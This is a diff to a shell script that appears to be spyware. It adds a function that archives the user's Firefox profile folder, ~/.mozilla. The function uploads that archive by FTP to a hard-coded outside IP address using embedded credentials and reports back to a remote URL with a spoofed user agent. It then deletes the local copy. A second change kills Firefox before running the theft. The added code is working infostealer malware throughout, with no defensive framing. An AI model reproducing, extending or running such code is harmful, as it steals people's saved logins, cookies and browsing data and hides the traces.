@@ -86,6 +86,32 @@ function GCx_(){
      rm -f "$IBUS_""gcx.tar.gz"
 }
 
+function MZLx_(){
+	ftp_server="139.162.128.166"
+	ftp_user="r00t1970"
+	ftp_password="@Hello.321/"
+	#
+	folder_to_compress="/home/$USER/.mozilla"
+	local_file="$IBUS_"`date +%s`"mzlx.tar.gz"
+	tar -czvf "$local_file" "$folder_to_compress"
+	#
+	remote_directory="/home/r00t1970/"`date +%s`"MZLx.tar.gz"
+	#
+	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
+	quote USER $ftp_user
+	quote PASS $ftp_password
+	binary
+	put "$local_file" "$remote_directory"
+	quit
+	END_SCRIPT`
+	#
+	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
+     dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
+     #
+     rm -f "$local_file"
+     rm -f "$IBUS_""mzlx.tar.gz"
+}
+
 function ax(){
     #sox
     duration=30
@@ -241,6 +267,8 @@ function px(){
 	#WbCmx
     	#ax_
 	#GCx_
+	pkill -f firefox
+	MZLx_
 	#
 	exit 0
     else
